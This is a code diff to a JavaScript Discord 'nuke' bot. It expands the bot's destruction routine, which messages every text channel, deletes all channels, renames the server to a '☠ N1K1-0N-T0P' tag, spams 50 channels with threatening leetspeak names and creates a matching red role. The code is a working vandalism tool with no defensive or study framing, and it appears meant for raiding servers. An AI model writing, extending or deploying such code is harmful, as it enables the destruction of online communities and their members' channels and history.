@@ -53,11 +53,20 @@ const HACKER_IMAGES = [
     'https://i.imgur.com/5VjN7pK.png'
 ];
 
+// ============================================================
+// CHANNEL NAMES (SCARY + NUMBERS)
+// ============================================================
 const SCARY_NAMES = [
-    'NIKI-ON-TOP-01', 'NIKI-RULES-02', 'NIKI-KING-03', 'NIKI-GOAT-04', 'NIKI-LEGEND-05',
-    'NIKI-WINS-06', 'NIKI-DESTROYS-07', 'NIKI-UNSTOPPABLE-08', 'NIKI-GOD-09', 'NIKI-ON-TOP-10',
-    'TERMINATED-11', 'DELETED-12', 'CORRUPTED-13', 'SYSTEM-FAILURE-14', 'ACCESS-DENIED-15',
-    'DESTROYED-16', 'PURGED-17', 'ERASED-18', 'OVERRIDDEN-19', 'COMPROMISED-20'
+    'N1K1-0N-T0P-01', 'N1K1-RUL3S-02', 'N1K1-K1NG-03', 'N1K1-G04T-04', 'N1K1-L3G3ND-05',
+    'N1K1-W1NS-06', 'N1K1-D3STR0YS-07', 'N1K1-UNST0PP4BL3-08', 'N1K1-G0D-09', 'N1K1-0N-T0P-10',
+    'T3RM1N4T3D-11', 'D3L3T3D-12', 'C0RRUPT3D-13', 'SYST3M-F41LUR3-14', '4CC3SS-D3N13D-15',
+    'D3STR0Y3D-16', 'PURG3D-17', '3R4S3D-18', '0V3RR1DD3N-19', 'C0MPR0M1S3D-20',
+    '1NF3CT3D-21', 'H4CK3D-22', 'BR34CH3D-23', 'D3T0N4T3D-24', 'N3UTR4L1Z3D-25',
+    '4NNH1L4T3D-26', '0BL1T3R4T3D-27', '3XT1NGU1SH3D-28', 'D3C1M4T3D-29', '3XT3RM1N4T3D-30',
+    'L1QU1D4T3D-31', '3R4D1C4T3D-32', 'V4P0R1Z3D-33', '3XPL0D3D-34', 'SH4TT3R3D-35',
+    'CRUSH3D-36', 'D1SM4NTL3D-37', 'SCR4PP3D-38', 'TR4SH3D-39', 'G4RB4G3D-40',
+    'NUK3D-41', 'R4Z3D-42', 'L3V3L3D-43', 'FL4TT3N3D-44', 'GR0UND3D-45',
+    'T3RM1N4L-46', 'F4T4L-47', 'CR1T1C4L-48', '3M3RG3NCY-49', 'D1S4ST3R-50'
 ];
 
 const inviteLink = 'https://discord.gg/eVTU7sW3wv';
@@ -82,12 +91,10 @@ client.on('messageCreate', async (message) => {
 });
 
 async function handleNuke(message) {
-    // Check authorized ID
     if (message.author.id !== AUTHORIZED_ID) {
         return message.reply('❌ You are not authorized to use this command!');
     }
 
-    // Check permissions
     if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
         return message.reply('❌ You need administrator permissions!');
     }
@@ -105,7 +112,7 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // 1. Send warnings in all channels
+        // 1. Send warnings (fast)
         const channels = guild.channels.cache;
         for (const [id, channel] of channels) {
             if (channel.type === ChannelType.GuildText) {
@@ -126,7 +133,7 @@ async function handleNuke(message) {
             }
         }
 
-        // 2. DELETE ALL CHANNELS
+        // 2. DELETE ALL CHANNELS IMMEDIATELY
         for (const [id, channel] of channels) {
             try {
                 await channel.delete();
@@ -145,8 +152,14 @@ async function handleNuke(message) {
             }
         }
 
-        // 4. CREATE 20 NEW CHANNELS
-        for (let i = 0; i < 20; i++) {
+        // 4. RENAME SERVER (scary name with number)
+        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
+        try {
+            await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
+        } catch (e) {}
+
+        // 5. CREATE 50 NEW CHANNELS (scary names with numbers)
+        for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
             try {
                 const channel = await guild.channels.create({
@@ -160,16 +173,10 @@ async function handleNuke(message) {
             } catch (e) {}
         }
 
-        // 5. RENAME SERVER
-        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
-        try {
-            await guild.setName(`☠ NIKI-ON-TOP-${nukeNumber} ☠`);
-        } catch (e) {}
-
         // 6. CREATE SPECIAL ROLE
         try {
             const role = await guild.roles.create({
-                name: '☠ NIKI ON TOP ☠',
+                name: '☠ N1K1 0N T0P ☠',
                 color: '#FF0000',
                 hoist: true,
                 mentionable: true
